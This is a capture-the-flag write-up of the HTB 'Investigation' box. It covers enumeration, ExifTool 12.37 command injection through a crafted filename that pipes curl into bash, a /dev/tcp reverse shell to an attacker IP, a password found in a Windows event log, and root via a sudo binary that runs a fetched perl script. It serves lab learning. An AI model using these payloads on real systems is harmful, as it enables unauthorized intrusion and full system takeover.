---
title: Investigation 
date: 2023-01-23 12:00:00
categories: [HTB,CTF]
tags: [htb]
---

# Enumeration

## Rustscan

```bash
mkdir rust; sudo rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.129.87.222 -- -sV -sC -oA ./rust/{{ip}}
```

```bash
Open 10.129.11.68:22
Open 10.129.11.68:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://eforenzics.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Dirsearch

```bash
dirsearch -u http://eforenzics.htb/
```

```bash
[20:42:57] Starting:                                         
[20:43:24] 301 -  317B  - /assets  ->  http://eforenzics.htb/assets/        
[20:43:24] 403 -  279B  - /assets/                                          
[20:43:41] 200 -   11KB - /index.html                                                                        
[20:44:08] 200 -    4KB - /upload.php  
```

## Website 

Checking the Website we notice that there's a service that they offer located at [http://eforenzics.htb/service.html](http://eforenzics.htb/service.html).  
The service is described as **Image Forensics**. You are able to upload an image file and they will provide a detailed forensic analysis.  

Uploading an image will result in a report that you can view.  

**Example**

```bash
ExifTool Version Number         : 12.37
File Name                       : image.jpg
Directory                       : .
File Size                       : 335 bytes
File Modification Date/Time     : 2023:01:23 20:03:07+00:00
File Access Date/Time           : 2023:01:23 20:03:07+00:00
File Inode Change Date/Time     : 2023:01:23 20:03:07+00:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
DjVu Version                    : 0.24
Spatial Resolution              : 300
Gamma                           : 2.2
Orientation                     : Horizontal (normal)
Warning                         : Ignored invalid metadata entry(s)
Image Width                     : 1
Image Height                    : 1
Encoding Process                : Extended sequential DCT, arithmetic coding
Bits Per Sample                 : 8
Color Components                : 1
Image Size                      : 1x1
Megapixels                      : 0.000001
```

The first line shows us the used ExifTool Version which is 12.37. If you look this up you'll come across [Command Injection: Exiftool before 12.38](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)

# Exploitation

Using the discovered vulnerability we will try to gain a shell on our target.

## Exiftool 12.37

```bash
# Generate malicious filename
cp image.jpg 'curl 10.10.14.71 | bash |'
# Generate an index.html containing our reverse shell code
cat index.html        
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.71/4444 0>&1"
# Host a webserver
python -m http.server 80
# In another tab create a listener
pwncat-cs -lp 4444
```

## Enumeration

After we received our shell it's time to enumerate the systmen as we are just the **www-data** user without any further permissions.  

### Linpeas

Linpeas will show us a cronjob that runs regularly at a specific time and uses a script located at **/usr/local/investigation**.  
Inside that folder we will find an E-Mail that contains a **Windows Security Log**.

**Cronjob**

```bash
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
```

### Password Discovery

By searching the security.evtx file we come across something that looks like a password which is stored under **TargetUserName**.  

```bash
# Convert .evtx to xml
python3 /home/mrk/.local/bin/evtx_dump.py ~/Downloads/security.evtx > events.xml
# Searching
grep "TargetUserName" events.xml | sort -u
...
<Data Name="TargetUserName">aanderson</Data>
<Data Name="TargetUserName">AAnderson</Data>
<Data Name="TargetUserName">Administrators</Data>
<Data Name="TargetUserName">CENSORED</Data>
<Data Name="TargetUserName">EFORENZICS-DI$</Data>
<Data Name="TargetUserName">hmarley</Data>
<Data Name="TargetUserName">HMarley</Data>
<Data Name="TargetUserName">hmraley</Data>
<Data Name="TargetUserName">ljenkins</Data>
<Data Name="TargetUserName">LJenkins</Data>
<Data Name="TargetUserName">lmonroe</Data>
<Data Name="TargetUserName">LMonroe</Data>
<Data Name="TargetUserName">LOCAL SERVICE</Data>
```

## Privilege Escalation: smorton

Using the password we are able to switch from **www-data** to **smorton**.  

```bash
su - smorton
```

# Privilege Escalation

## Enumeration

Checking the permissiosn of **smorton** reveals that we are able to run **/usr/bin/binary** as root.

```bash
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

## Analyzing /usr/bin/binary

Executing the binary does result in receiving the text **Exiting...**

We pull that binary to our machine and use [Cutter](https://cutter.re/) to take a look at the decompiled code.

**Snippet of decompiled function: main**

```c
    if (argc != 3) {
        puts("Exiting... ");
        exit(0);
    }
    iVar1 = getuid();
    if (iVar1 != 0) {
        puts("Exiting... ");
        exit(0);
    }
    iVar1 = strcmp(argv[2], "lDnxUysaQn");
    if (iVar1 == 0) {
        puts("Running... ");
        uVar2 = fopen(argv[2], 0x2027);
        uVar3 = curl_easy_init();
        curl_easy_setopt(uVar3, 0x2712, argv[1]);
        curl_easy_setopt(uVar3, 0x2711, uVar2);
        curl_easy_setopt(uVar3, 0x2d, 1);
        iVar1 = curl_easy_perform(uVar3);
        if (iVar1 == 0) {
            iVar1 = snprintf(0, 0, 0x202a, argv[2]);
            uVar4 = malloc((int64_t)iVar1 + 1);
            snprintf(uVar4, (int64_t)iVar1 + 1, 0x202a, argv[2]);
            iVar1 = snprintf(0, 0, "perl ./%s", uVar4);
            uVar5 = malloc((int64_t)iVar1 + 1);
            snprintf(uVar5, (int64_t)iVar1 + 1, "perl ./%s", uVar4);
            fclose(uVar2);
            .plt.sec(uVar3);
            setuid(0);
            system(uVar5);
            system("rm -f ./lDnxUysaQn");
            return 0;
        }
        puts("Exiting... ");
        exit(0);
    }
    puts("Exiting... ");
    exit(0);
    return 0;
```

I'm not a pro at asm or c but looking at the code it's clear to me that we have to:  

1. Provide 2 additional arguments
2. argv[1] should be a perl script hosted on a web resource
3. argv[2] has to be the string **lDnxUysaQn**

## Become Root

**root.pl**

Let's prepare a simple perl script to get a root shell  

```perl
exec "/bin/bash";
```

**Python Webserver**  

Host a webserver to serve that file  

```bash
python3 -m http.server 8080
```

**Privilege Escalation**  

The fun part, let's become root  

```bash
smorton@investigation:~$ /bin/sudo /usr/bin/binary http://10.10.14.52:8080/root.pl lDnxUysaQn
Running... 
root@investigation:/home/smorton# whoami
root
```